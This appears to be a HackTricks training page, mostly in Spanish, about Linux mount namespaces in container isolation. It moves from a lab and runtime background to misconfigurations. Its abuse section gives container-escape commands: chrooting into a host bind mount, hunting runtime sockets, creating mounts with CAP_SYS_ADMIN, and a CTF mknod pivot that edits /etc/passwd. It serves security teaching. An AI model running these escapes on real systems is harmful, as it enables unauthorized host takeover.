# Espacio de nombres de montaje

{{#include ../../../../../banners/hacktricks-training.md}}

## Resumen

El espacio de nombres de montaje controla la **tabla de montaje** que ve un proceso. Esta es una de las características de aislamiento de contenedores más importantes porque el sistema de archivos raíz, los bind mounts, los tmpfs mounts, la vista de procfs, la exposición de sysfs y muchas monturas auxiliares específicas del runtime se expresan a través de esa tabla de montaje. Dos procesos pueden acceder ambos a `/`, `/proc`, `/sys` o `/tmp`, pero a qué apuntan esas rutas depende del espacio de nombres de montaje en el que estén.

Desde la perspectiva de la seguridad de contenedores, el espacio de nombres de montaje suele ser la diferencia entre "esto es un sistema de archivos de aplicación cuidadosamente preparado" y "este proceso puede ver o influir directamente en el sistema de archivos del host". Por eso los bind mounts, los volúmenes `hostPath`, las operaciones de montaje privilegiadas y las exposiciones de `/proc` o `/sys` con permisos de escritura giran en torno a este espacio de nombres.

## Operación

Cuando un runtime lanza un contenedor, normalmente crea un nuevo espacio de nombres de montaje, prepara un sistema de archivos raíz para el contenedor, monta procfs y otros sistemas de ficheros auxiliares según sea necesario, y opcionalmente añade bind mounts, tmpfs mounts, secrets, config maps o host paths. Una vez que ese proceso se está ejecutando dentro del namespace, el conjunto de montajes que ve queda en gran medida desacoplado de la vista por defecto del host. El host aún puede ver el sistema de archivos subyacente real, pero el contenedor ve la versión ensamblada para él por el runtime.

Esto es potente porque permite que el contenedor crea que tiene su propio sistema de archivos raíz aunque el host siga gestionando todo. También es peligroso porque si el runtime expone un montaje incorrecto, el proceso de repente gana visibilidad sobre recursos del host que el resto del modelo de seguridad puede no haber sido diseñado para proteger.

## Laboratorio

Puedes crear un espacio de nombres de montaje privado con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si abres otra shell fuera de ese namespace e inspeccionas la tabla de montajes, verás que el montaje tmpfs existe solo dentro del mount namespace aislado. Este es un ejercicio útil porque muestra que el aislamiento de montajes no es una teoría abstracta; el kernel está literalmente presentando una tabla de montajes diferente al proceso.
Si abres otra shell fuera de ese namespace e inspeccionas la tabla de montajes, el montaje tmpfs existirá únicamente dentro del mount namespace aislado.

Dentro de los contenedores, una comparación rápida es:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
El segundo ejemplo demuestra lo fácil que es para una configuración de runtime abrir un gran agujero en la frontera del sistema de archivos.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

This means that when you review a container filesystem problem, you are usually not looking at an isolated Docker quirk. You are looking at a mount-namespace and runtime-configuration problem expressed through whatever platform launched the workload.

## Misconfigurations

The most obvious and dangerous mistake is exposing the host root filesystem or another sensitive host path through a bind mount, for example `-v /:/host` or a writable `hostPath` in Kubernetes. At that point, the question is no longer "can the container somehow escape?" but rather "how much useful host content is already directly visible and writable?" A writable host bind mount often turns the rest of the exploit into a simple matter of file placement, chrooting, config modification, or runtime socket discovery.

Another common problem is exposing host `/proc` or `/sys` in ways that bypass the safer container view. These filesystems are not ordinary data mounts; they are interfaces into kernel and process state. If the workload reaches the host versions directly, many of the assumptions behind container hardening stop applying cleanly.

Read-only protections matter too. A read-only root filesystem does not magically secure a container, but it removes a large amount of attacker staging space and makes persistence, helper-binary placement, and config tampering more difficult. Conversely, a writable root or writable host bind mount gives an attacker room to prepare the next step.

## Abuse

When the mount namespace is misused, attackers commonly do one of four things. They **read host data** that should have remained outside the container. They **modify host configuration** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

If the container can already see the host filesystem, the rest of the security model changes immediately.

When you suspect a host bind mount, first confirm what is available and whether it is writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si el sistema de archivos raíz del host está montado en lectura-escritura, el acceso directo al host suele ser tan simple como:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si el objetivo es obtener acceso privilegiado en tiempo de ejecución en lugar de chrooting directo, enumera sockets y el estado en ejecución:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` está presente, pruebe también si se pueden crear nuevos montajes desde dentro del contenedor:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Ejemplo completo: Two-Shell `mknod` Pivot

Surge una vía de abuso más especializada cuando el container root user puede crear block devices, el host y el container comparten una identidad de usuario de forma útil, y el atacante ya tiene un low-privilege foothold en el host. En esa situación, el container puede crear un nodo de dispositivo como `/dev/sda`, y el low-privilege host user puede luego leerlo a través de `/proc/<pid>/root/` para el proceso del container correspondiente.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Desde el host, como el usuario de bajo privilegio correspondiente después de localizar el PID del shell del contenedor:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lección importante no es la búsqueda exacta de cadenas CTF. Es que la exposición de mount-namespace a través de `/proc/<pid>/root/` puede permitir a un usuario del host reutilizar device nodes creados por el container incluso cuando la cgroup device policy impedía su uso directo dentro del container.

## Comprobaciones

Estos comandos sirven para mostrarte la vista del sistema de archivos en la que el proceso actual está realmente ejecutándose. El objetivo es detectar montajes provenientes del host, rutas sensibles con permisos de escritura y cualquier cosa que parezca más amplia que el sistema de archivos raíz normal de un contenedor de aplicación.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Lo interesante aquí:

- Los Bind mounts desde el host, especialmente `/`, `/proc`, `/sys`, los directorios de estado en runtime, o ubicaciones de sockets, deben destacar de inmediato.
- Los read-write mounts inesperados suelen ser más importantes que un gran número de read-only helper mounts.
- `mountinfo` suele ser el mejor lugar para ver si una ruta es realmente host-derived u overlay-backed.

Estas comprobaciones determinan **qué recursos son visibles en este namespace**, **cuáles son host-derived**, y **cuáles de ellos son escribibles o sensibles para la seguridad**.
{{#include ../../../../../banners/hacktricks-training.md}}
